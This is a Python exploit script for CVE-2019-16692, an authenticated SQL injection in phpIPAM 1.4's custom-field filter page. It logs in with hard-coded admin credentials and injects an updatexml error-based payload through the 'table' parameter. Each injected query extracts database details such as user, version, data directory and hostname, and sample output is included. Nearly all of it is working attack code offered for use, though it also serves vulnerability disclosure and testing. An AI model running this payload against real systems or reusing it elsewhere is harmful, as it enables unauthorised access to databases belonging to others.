#!/usr/bin/env python3
# Exploit Title: phpIPAM Custom Field Filter SQL Injection
# Exploit Announcement Date: September 16, 2019 5:18 AM
# Exploit Creation Date: September 27, 2019
# Exploit Author: Kevin Kirsche
# Vendor Homepage: https://phpipam.net
# Software Link: https://github.com/phpipam/phpipam/archive/1.4.tar.gz
# Version: 1.4
# Tested on: Ubuntu 18.04 / MariaDB 10.4
# Requires:
#   Python 3
#   requests package
# CVE: CVE-2019-16692

# For more details, view:
# https://github.com/phpipam/phpipam/issues/2738
# https://github.com/kkirsche/CVE-2019-16692

# Example Output
# [+] Executing select user()
# [*] Received: phpipam@172.18.0.4
# [+] Executing select system_user()
# [*] Received: phpipam@172.18.0.4
# [+] Executing select @@version
# [*] Received: .4.8-MariaDB-1:10.4.8+maria~b
# [+] Executing select @@datadir
# [*] Received: /var/lib/mysq
# [+] Executing select @@hostname
# [*] Received: ubuntu


from requests import Session

host = "localhost"
login_url = f"http://{host}/app/login/login_check.php"
exploit_url = f"http://{host}/app/admin/custom-fields/filter-result.php"

credentials = {
    "ipamusername": "Admin",
    "ipampassword": "Password",
}

payload = {
    "action": "add",
    "table": "",
}


cmds = {
    "unpriv": [
        "select user()",
        "select system_user()",
        "select @@version",
        "select @@datadir",
        "select @@hostname",
    ]
}

if __name__ == "__main__":
    client = Session()
    resp = client.post(login_url, data=credentials)
    if resp.status_code == 200:
        for cmd in cmds["unpriv"]:
            print(f"[+] Executing {cmd}")
            payload["table"] = f"users`where 1=(updatexml(1,concat(0x3a,({cmd})),1))#`"
            resp = client.post(exploit_url, data=payload)
            info = resp.text.lstrip("<div class='alert alert-danger'>SQLSTATE[HY000]: General error: 1105 XPATH syntax error: ':").rstrip("'</div><div class='alert alert-success'>Filter saved</div>")
            print(f"[*] Received: {info}")